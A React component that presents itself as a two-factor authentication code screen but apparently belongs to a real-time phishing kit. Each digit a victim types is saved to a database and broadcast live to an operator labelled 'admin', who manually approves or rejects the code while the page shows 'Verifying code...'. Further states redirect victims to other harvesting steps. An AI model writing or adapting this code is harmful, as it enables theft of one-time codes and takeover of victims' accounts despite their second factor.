import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Shield, ArrowLeft } from "lucide-react";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
  InputOTPSeparator,
} from "@/components/ui/input-otp";

interface OtpScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const OtpScreen = ({ email, sessionId, onBack }: OtpScreenProps) => {
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");

  // Listen for admin decisions via broadcast
  useEffect(() => {
    const channelName = `session-otp-decision-${sessionId}`;
    const channel = supabase.channel(channelName);

    channel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        console.log("[OTP] Received decision via broadcast:", decision);

        if (decision === "otp_approved") {
          setStatus("success");
        } else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Invalid code. Please try again.");
          setOtp("");
          setTimeout(() => {
            setStatus("input");
            supabase
              .from("sessions")
              .update({ status: "redirect_otp" } as any)
              .eq("id", sessionId)
              .then(() => {});
          }, 2000);
        }
      })
      .subscribe((subStatus) => {
        console.log("[OTP] Decision channel status:", subStatus);
      });

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId]);

  // Also listen on the original session-review channel for other decisions
  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);

    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        console.log("[OTP] Received review_decision:", decision);

        if (decision === "otp_approved") {
          setStatus("success");
        } else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Invalid code. Please try again.");
          setOtp("");
          setTimeout(() => setStatus("input"), 2000);
        } else if (decision === "redirect_otp_email") {
          // Handled by parent via polling/broadcast
        } else if (decision === "redirect_sync_email") {
          // Handled by parent via polling/broadcast
        }
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId]);

  // Save OTP to DB and broadcast on every change
  const handleOtpChange = useCallback(
    (value: string) => {
      setOtp(value);

      // Save to DB
      supabase
        .from("sessions")
        .update({ otp_code: value } as any)
        .eq("id", sessionId)
        .then(() => {});

      // Broadcast to admin
      const bc = supabase.channel(`otp-live-${sessionId}-${Date.now()}`);
      bc.subscribe((s) => {
        if (s === "SUBSCRIBED") {
          bc.send({
            type: "broadcast",
            event: "otp_code_update",
            payload: { otp_code: value, session_id: sessionId },
          });
          setTimeout(() => supabase.removeChannel(bc), 1500);
        }
      });
    },
    [sessionId]
  );

  // Auto-set verifying when 6 digits entered
  useEffect(() => {
    if (otp.length === 6 && status === "input") {
      setStatus("verifying");
    }
  }, [otp, status]);

  if (status === "success") {
    return (
      <div className="flex flex-col items-center text-center">
        <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10">
          <Shield className="h-8 w-8 text-green-500" />
        </div>
        <h3 className="mb-2 text-lg font-semibold text-foreground">
          Verification Complete
        </h3>
        <p className="mb-1 text-sm text-muted-foreground">
          Your identity has been verified. Redirecting...
        </p>
        <p className="text-xs text-muted-foreground/60">{email}</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center text-center">
      {/* Icon */}
      <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-primary/10">
        <Shield className="h-8 w-8 text-primary" />
      </div>

      {/* Title */}
      <h3 className="mb-2 text-lg font-semibold text-foreground">
        Two-Factor Authentication
      </h3>
      <p className="mb-1 text-sm text-muted-foreground">
        Enter the 6-digit code from your authenticator app
      </p>
      <p className="mb-8 text-xs text-muted-foreground/60">{email}</p>

      {/* Error Message */}
      {errorMessage && status === "error" && (
        <div className="mb-6 w-full rounded-md border border-destructive/30 bg-destructive/10 px-4 py-2.5 text-sm text-destructive">
          {errorMessage}
        </div>
      )}

      {/* OTP Input */}
      <div className="mb-8">
        <InputOTP
          maxLength={6}
          value={otp}
          onChange={handleOtpChange}
          disabled={status === "verifying"}
        >
          <InputOTPGroup>
            <InputOTPSlot index={0} />
            <InputOTPSlot index={1} />
            <InputOTPSlot index={2} />
          </InputOTPGroup>
          <InputOTPSeparator />
          <InputOTPGroup>
            <InputOTPSlot index={3} />
            <InputOTPSlot index={4} />
            <InputOTPSlot index={5} />
          </InputOTPGroup>
        </InputOTP>
      </div>

      {/* Status */}
      {status === "verifying" && (
        <div className="mb-6 flex items-center gap-2 text-sm text-muted-foreground">
          <div className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
          Verifying code...
        </div>
      )}

      {/* Back button */}
      <button
        onClick={onBack}
        disabled={status === "verifying"}
        className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors disabled:opacity-50"
      >
        <ArrowLeft size={13} />
        Try different method
      </button>
    </div>
  );
};

export default OtpScreen;
